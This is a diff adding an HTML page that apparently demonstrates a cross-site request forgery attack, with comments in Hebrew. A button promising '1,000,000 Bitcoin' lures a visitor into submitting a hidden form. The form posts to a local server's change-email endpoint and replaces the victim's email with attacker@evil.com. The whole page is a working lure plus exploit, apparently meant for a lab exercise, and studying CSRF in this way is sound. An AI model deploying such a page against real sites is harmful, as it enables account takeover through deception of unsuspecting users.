@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Get 1,000,000 Bitcoin 💰</title>
+</head>
+<body>
+
+<h1>🚀 Get 1,000,000 Bitcoin</h1>
+<p>Click the button below to instantly become rich.</p>
+
+<!-- כפתור תמים -->
+<button id="attackBtn">Get 1,000,000 Bitcoin</button>
+
+<!-- טופס נסתר ששולח בקשה לשרת הקורבן -->
+<form id="csrfForm"
+      action="http://127.0.0.1:5000/change-email"
+      method="POST"
+      style="display:none">
+
+  <!-- הנתון שהשרת של הקורבן מצפה לו -->
+  <input type="hidden" name="email" value="attacker@evil.com">
+
+</form>
+
+<script>
+  document.getElementById("attackBtn").addEventListener("click", () => {
+    console.log("CSRF request sent");
+    document.getElementById("csrfForm").submit();
+  });
+</script>
+
+</body>
+</html>
